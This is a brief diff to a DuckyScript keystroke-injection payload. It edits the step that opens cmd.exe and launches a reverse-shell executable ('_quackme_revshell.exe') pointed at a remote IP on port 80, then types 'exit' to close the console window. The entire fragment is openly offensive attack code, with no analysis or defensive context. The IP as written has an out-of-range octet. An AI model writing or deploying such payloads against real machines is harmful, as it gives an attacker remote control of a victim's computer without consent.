@@ -55,9 +55,11 @@ ENTER
 DELAY 1000
 
 REM Execute payload
-STRING cmd.exe /c %SystemDrive%\_kit\_quackme_revshell.exe 104.258.157.103 80
+STRING cmd.exe /c "start %SystemDrive%\_kit\_quackme_revshell.exe 104.258.157.103 80"
 ENTER
 DELAY 1000
-ALT F4
+STRING exit
+DELAY 500
+ENTER
 
 REM END
